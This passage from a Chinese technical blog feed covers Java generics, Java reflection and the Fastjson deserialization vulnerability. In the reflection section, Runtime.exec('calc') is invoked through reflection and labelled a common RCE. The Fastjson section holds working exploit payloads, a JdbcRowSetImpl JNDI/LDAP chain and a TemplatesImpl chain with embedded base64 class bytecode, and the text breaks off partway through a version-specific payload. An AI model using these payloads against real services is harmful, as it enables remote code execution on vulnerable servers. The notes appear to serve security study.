src="/../images/java.lang.png?lastModify=1695619823" alt="img"></p></li></ul><h2 id="泛型的作用"><a href="#泛型的作用" class="headerlink" title="泛型的作用"></a>泛型的作用</h2><p><strong>代码复用</strong></p><p><img src="/../images/image-20230925132013782.png" alt="image-20230925132013782"></p><p><strong>类型安全，编译器会检查类型</strong></p><p><img src="/../images/image-20230925130137491.png" alt="image-20230925130137491"></p><p>引入泛型后，它将提供类型的约束，提供编译前的检查：</p><p><img src="/../images/image-20230925130207681.png" alt="image-20230925130207681"></p><h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//此处T可以随便写为任意标识，常见的如&lt;T&gt; Type &lt;E&gt; Element &lt;K&gt; Key &lt;V&gt; value</span></span><br><span class="line"><span class="comment">//在实例化泛型类时，必须指定T的具体类型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generic</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="comment">//key这个成员变量的类型为T,T的类型由外部指定</span></span><br><span class="line">    <span class="keyword">private</span> T key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Generic</span><span class="params">(T key)</span> &#123; <span class="comment">//泛型构造方法形参key的类型也为T，T的类型由外部指定</span></span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getKey</span><span class="params">()</span>&#123; <span class="comment">//泛型方法getKey的返回值类型为T，T的类型由外部指定</span></span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//泛型的类型参数只能是类类型（包括自定义类），不能是简单类型</span></span><br><span class="line"><span class="comment">//传入的实参类型需与泛型的类型参数类型相同，即为Integer.</span></span><br><span class="line">        Generic&lt;Integer&gt; genericInteger = <span class="keyword">new</span> <span class="title class_">Generic</span>&lt;Integer&gt;(<span class="number">123456</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入的实参类型需与泛型的类型参数类型相同，即为String.</span></span><br><span class="line">        Generic&lt;String&gt; genericString = <span class="keyword">new</span> <span class="title class_">Generic</span>&lt;String&gt;(<span class="string">&quot;key_vlaue&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;泛型测试 key is &quot;</span> + genericInteger.getKey());</span><br><span class="line">        System.out.println(<span class="string">&quot;泛型测试 key is &quot;</span> + genericString.getKey());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230925131006945.png" alt="image-20230925131006945"></p><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个泛型接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Generator</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">next</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 传入泛型实参时：</span></span><br><span class="line"><span class="comment"> * 定义一个生产器实现这个接口,虽然我们只创建了一个泛型接口Generator&lt;T&gt;</span></span><br><span class="line"><span class="comment"> * 但是我们可以为T传入无数个实参，形成无数种类型的Generator接口。</span></span><br><span class="line"><span class="comment"> * 在实现类实现泛型接口时，如已将泛型类型传入实参类型，则所有使用泛型的地方都要替换成传入的实参类型</span></span><br><span class="line"><span class="comment"> * 即：Generator&lt;T&gt;，public T next();中的的T都要替换成传入的String类型。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitGenerator</span> <span class="keyword">implements</span> <span class="title class_">Generator</span>&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String[] fruits = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Pear&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">rand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">return</span> fruits[rand.nextInt(<span class="number">3</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型通配符"><a href="#泛型通配符" class="headerlink" title="泛型通配符"></a>泛型通配符</h2><p><code>Ingeter</code>是<code>Number</code>的一个子类，但是<code>Generic&lt;Integer&gt;</code>不能被看作为<code>Generic&lt;Number&gt;</code>的子类。</p><p><img src="/../images/image-20230925134703767.png" alt="image-20230925134703767"></p><p>由此可以看出:同一种泛型可以对应多个版本（因为参数类型是不确定的），不同版本的泛型类实例是不兼容的。</p><p>因此我们需要一个在逻辑上可以表示同时是<code>Generic&lt;Integer&gt;</code>和<code>Generic&lt;Number&gt;</code>父类的引用类型。由此类型通配符<code>?</code>应运而生。</p><p><img src="/../images/image-20230925134758827.png" alt="image-20230925134758827"></p><p><strong>类型通配符一般是使用？代替具体的类型实参，此处的？和Number、String、Integer一样都是一种实际的类型，可以把？看成所有类型的父类。是一种真实的类型。</strong></p><h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><p><strong>泛型类中的使用了泛型的成员方法并不是泛型方法</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generic</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Generic</span><span class="params">(T key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该泛型类的构造方法形参key的类型也为T，但是这个方法并不是泛型方法，只是类中一个普通的成员方法。因为该方法能使用T是因为在声明泛型类时T已经被指定了。</p><p>如果该方法使用了泛型类没有声明的泛型E，编译器就会报错</p><p><img src="/../images/image-20230925155644795.png" alt="image-20230925155644795"></p><p><strong>只有声明了<code>&lt;&gt;</code>的方法才是泛型方法</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generic</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;E&gt; T <span class="title function_">getKey</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2023/05/01/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/05/01/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是<strong>JVM在运行状态的时候才动态加载类</strong>，对于任意一个类，都能够知道这个类中的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p></blockquote><p>类加载流程如下</p><p><img src="/../images/EsePjI7n9CtyqbA.png" alt="image-20230502220543579"></p><p>JVM在第一次读取到一种<code>class</code>类型时，将其加载进内存后会为其创建一个<code>Class</code>类型的实例，并在该实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p><h2 id="相关类"><a href="#相关类" class="headerlink" title="相关类"></a>相关类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.Class <span class="comment">//类对象</span></span><br><span class="line"></span><br><span class="line">java.lang.reflect.Constructor <span class="comment">//类的构造器对象</span></span><br><span class="line"></span><br><span class="line">java.lang.reflect.Field <span class="comment">//类的属性对象</span></span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method <span class="comment">//类的方法对象</span></span><br><span class="line"></span><br><span class="line">java.lang.reflect.Modifier <span class="comment">//类的修饰符对象</span></span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><code>Class</code>类型实际上是一个名叫<code>Class</code>的<code>class</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Class</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Class</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出Class类的构造器是私有的，所以只有JVM能够创建Class对象。</p><p>如果我们想使用就需要以下几种方法获得：</p><h3 id="获得Class类"><a href="#获得Class类" class="headerlink" title="获得Class类"></a>获得Class类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用Class类的静态方法forName获取某个类的Class类实例</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">注：类名默认为类完整路径,如java.lang.Runtime,通常使用这个来获得Class类实例</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用某个类实例的getClass()方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).getClass();    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//访问某个类实例的class属性，这个属性就存储着这个类对应的Class类的实例</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).class;</span><br></pre></td></tr></table></figure><h3 id="获得构造函数"><a href="#获得构造函数" class="headerlink" title="获得构造函数"></a>获得构造函数</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数</span><br></pre></td></tr></table></figure><h3 id="实例化类"><a href="#实例化类" class="headerlink" title="实例化类"></a>实例化类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">clz.newInstance();</span><br></pre></td></tr></table></figure><blockquote><p>实际上是调用了该类的无参构造函数</p><p>所以前提条件：</p><p>该类有无参构造函数，并且是公有的</p></blockquote><h3 id="获得成员方法"><a href="#获得成员方法" class="headerlink" title="获得成员方法"></a>获得成员方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method method=Class.getMethod(String name, 类&lt;?&gt;... parameterTypes) <span class="comment">//返回该类所声明的public方法</span></span><br><span class="line"></span><br><span class="line">Method method=Class.getDeclaredMethod(String name, 类&lt;?&gt;... parameterTypes) <span class="comment">//返回该类所声明的所有方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数为方法名，第二个参数为这个方法的参数类型</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Method method=Class.getMethods() <span class="comment">//获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span></span><br><span class="line"></span><br><span class="line">Method method=Class.getDeclaredMethods() <span class="comment">// 获取该类中的所有方法</span></span><br></pre></td></tr></table></figure><h3 id="使用成员方法"><a href="#使用成员方法" class="headerlink" title="使用成员方法"></a>使用成员方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">method.invoke(类实例, [该方法的参数类型]);</span><br></pre></td></tr></table></figure><blockquote><p><strong>如果调用这个方法是普通方法，第一个参数就是类对象；</strong></p><p><strong>如果调用这个方法是静态方法，第一个参数就是类；</strong></p></blockquote><h3 id="获取成员变量"><a href="#获取成员变量" class="headerlink" title="获取成员变量"></a>获取成员变量</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] getFields() ：获取所有 <span class="keyword">public</span> 修饰的成员变量</span><br><span class="line"></span><br><span class="line">Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</span><br><span class="line"></span><br><span class="line">Field <span class="title function_">getField</span><span class="params">(String name)</span> 获取指定名称的 <span class="keyword">public</span> 修饰的成员变量</span><br><span class="line"></span><br><span class="line">Field <span class="title function_">getDeclaredField</span><span class="params">(String name)</span> 获取指定的成员变量</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>常用的RCE</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>注意<code>Runtime</code>这个类的构造函数是私有的，所以我们正常只能通过公有的方法<code>Runtime.getRuntime() </code>来获取到 Runtime 对象</p></blockquote><p>通过反射实现上述代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">//首先需要获得Runtime类的Class实例</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//获得Runtime类的getRuntime方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getruntime</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用该方法获得Runtime对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getruntime.invoke(clz);</span><br><span class="line"><span class="comment">//获得Runtime类的exec方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="comment">//调用exec方法执行命令</span></span><br><span class="line">exec.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>整合成一句</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="强制访问私有，保护"><a href="#强制访问私有，保护" class="headerlink" title="强制访问私有，保护"></a>强制访问私有，保护</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>上述命令执行代码可以转为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获得构造函数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">        <span class="comment">// 获得访问私有方法和属性的权限</span></span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改final字段"><a href="#修改final字段" class="headerlink" title="修改final字段"></a>修改<code>final</code>字段</h3><p><img src="/../images/image-20230503115304804.png" alt="image-20230503115304804"></p><ul><li><p>只有final修饰，并且为间接赋值，可以修改</p></li><li><p>如果是final+static修饰，并且为间接赋值，需要先去掉final修饰符才能修改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得modifiers</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameModifyField</span> <span class="operator">=</span> nameField.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line"><span class="comment">// 修改权限</span></span><br><span class="line">nameModifyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 去除final修饰符</span></span><br><span class="line">nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"><span class="comment">// 修改Field值</span></span><br><span class="line">nameField.set(m,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;Drunkbaby Too Silly&quot;</span>));</span><br><span class="line"><span class="comment">// 重新添加上final修饰符</span></span><br><span class="line">nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson漏洞</title>
      <link href="/2023/05/01/fastjson/"/>
      <url>/2023/05/01/fastjson/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJson是什么"><a href="#FastJson是什么" class="headerlink" title="FastJson是什么"></a>FastJson是什么</h1><blockquote><p>Fastjson是阿里巴巴公司开源的一款json解析器，它可以解析 JSON 格式的字符串，支持<strong>将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到JavaBean</strong>。</p></blockquote><h1 id="FastJson反序列化漏洞"><a href="#FastJson反序列化漏洞" class="headerlink" title="FastJson反序列化漏洞"></a>FastJson反序列化漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>1.2.24：fastjson在解析json的过程中，支持使用<code>autoType</code>来实例化<strong>某一个具体的类</strong>，并调用该类的<code>setter/getter</code>方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。 </p><p>1.2.47：fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p></blockquote><h3 id="User类"><a href="#User类" class="headerlink" title="User类"></a>User类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setId&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.toJSONString(class);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lihua&quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">System.out.println(json);</span><br></pre></td></tr></table></figure><blockquote><p>序列化时会自动调用<code>Getter</code>方法</p></blockquote><p><img src="/../images/image-20230912154025083.png" alt="image-20230912154025083"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lihua&quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(json);</span><br></pre></td></tr></table></figure><blockquote><p>传入<code>SerializerFeature.WriteClassName</code>可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。</p></blockquote><p><img src="/../images/image-20230912153839072.png" alt="image-20230912153839072"></p><p><code>@type</code> 指定类，其他为该类<code>Getter</code>方法返回的类属性</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parse(json) </span><br><span class="line">JSON.parseObject(json,class) </span><br></pre></td></tr></table></figure><p>只有在指定是哪一个类的前提下</p><blockquote><p>使用<code>JSON.parse</code>反序列化会调用此类的set方法</p><p>使用<code>JSON.parseObject</code>反序列化会调用此类的get和set方法</p></blockquote><p><img src="/../images/image-20230912155454575.png" alt="image-20230912155454575"></p><p>如何指定一个类</p><ul><li><p>json中使用@type指定</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230912155538136.png" alt="image-20230912155538136"></p></li><li><p><code>parseObject</code>中的第二个参数指定</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(json2, User.class)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230912155631461.png" alt="image-20230912155631461"></p></li></ul><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h3 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h3><blockquote><p>本质是JNDI注入，jdk版本需要满足 8u161 &lt; jdk &lt; 8u191</p></blockquote><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/g0tvin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>setDataSourceName</code>方法把传进去的值赋给<code>dataSource</code></p><p><code>setautoCommit</code>方法需要传入一个布尔类型的参数，跟进connect方法，<code>lookup(getDataSourceName())</code> lookup函数链接我们写入的服务 加载我们的恶意类</p></blockquote><h3 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h3><blockquote><p>加载java字节码并实例化，可以通过该链注入内存马</p></blockquote><p>局限性</p><p><img src="/../images/image-20231008151707946.png" alt="image-20231008151707946"></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>&#x27;_name&#x27;<span class="punctuation">:</span>&#x27;exp&#x27;<span class="punctuation">,</span>&#x27;_tfactory&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>Fastjson在不同版本下的利用方式很不同，所以存在Fastjson漏洞时，首要判断Fastjson的版本。</p></blockquote><h4 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span 